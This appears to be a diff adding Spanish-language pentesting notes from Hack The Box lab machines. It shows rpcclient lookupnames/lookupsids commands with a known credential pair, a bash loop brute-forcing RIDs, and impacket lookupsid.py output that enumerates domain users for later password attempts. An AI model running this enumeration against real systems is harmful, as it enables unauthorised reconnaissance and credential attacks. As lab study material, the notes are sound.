@@ -24,3 +24,56 @@ Comando -> rpcclient -U "" 10.10.10.169 -N -c "querygroupmem 0x200"
 
 // Nos saldra un usuario o varios que perteneceran al Domain Admin, en este caso sale en 0x1f4 asi que veremos su informacion
 Comando -> rpcclient -U "" 10.10.10.169 -N -c "queryuser 0x1f4"
+
+----------------------------------------------------------------
+              ENUMERAR USUARIOS CON LOOKUPNAMES
+-----------------------------------------------------------------
+[MAQUINA Heist]
+
+[*] En el caso de intentar enumerar usuarios y grupos no nos lo permitira, pero si podremos ejecutar el siguiente lookupnames, con esto podremos enumerar usuarios
+
+  ~$> rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupnames hazard"
+
+  [+] Output:
+  hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1
+
+[*] Para verificar que un sid sea perteneciente a un usuario, podremos ejecutar el siguiente comando 
+
+  ~$> rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008"
+
+  [+] Output:
+    S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
+
+[*] En este caso si nos fijamos el ultimo numero acaba en 1008, entonces podriamos crear un oneliner el cual nos intente  comprobar si hay mas usuarios en el sistema
+
+  ~$> for i in $(seq 1000 1050); do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v "unknown"; done
+
+  [+] Output:
+
+  S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
+  S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
+  S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
+  S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
+
+[*] Tambien tenemos una tool de impacket llamada lookupsid.py que hace lo mismo que e hecho
+
+  ~$> lookupsid.py hazard:stealth1agent@10.10.10.149
+
+  [+] Output:
+  Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation
+
+  [*] Brute forcing SIDs at 10.10.10.149
+  [*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
+  [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
+  500: SUPPORTDESK\Administrator (SidTypeUser)
+  501: SUPPORTDESK\Guest (SidTypeUser)
+  503: SUPPORTDESK\DefaultAccount (SidTypeUser)
+  504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
+  513: SUPPORTDESK\None (SidTypeGroup)
+  1008: SUPPORTDESK\Hazard (SidTypeUser)
+  1009: SUPPORTDESK\support (SidTypeUser)
+  1012: SUPPORTDESK\Chase (SidTypeUser)
+  1013: SUPPORTDESK\Jason (SidTypeUser)
+
+
+[*] De esta forma podremos probar passwords con mas usuarios
